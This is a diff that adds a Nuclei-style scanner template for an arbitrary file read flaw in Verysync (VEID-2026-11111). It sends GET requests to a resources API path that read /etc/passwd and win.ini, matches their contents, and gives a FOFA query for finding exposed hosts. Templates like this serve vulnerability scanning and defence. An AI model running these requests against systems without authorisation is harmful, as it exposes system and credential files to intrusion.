@@ -1,0 +1,37 @@
+id: verysync-api-resources-fileread
+info:
+  name: 微力同步-Verysync任意文件读取漏洞(VEID-2026-11111)
+  author: leadlife
+  severity: high
+  description: 微力同步-Verysync任意文件读取漏洞,攻击者可进行任意文件读取,从而获得敏感信息。
+  reference: 
+    - https://mp.weixin.qq.com/s/QtcyJ8ZOS5L_NAeGuKHyTQ
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="Verysync"
+    tips:
+    repair:
+    version:
+  tags: fileread,verysync
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/rest/f/api/resources/f96956469e7be39d/etc/passwd?override=false"
+      - "{{BaseURL}}/rest/f/api/resources/f96956469e7be39d/windows/win.ini?override=false"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
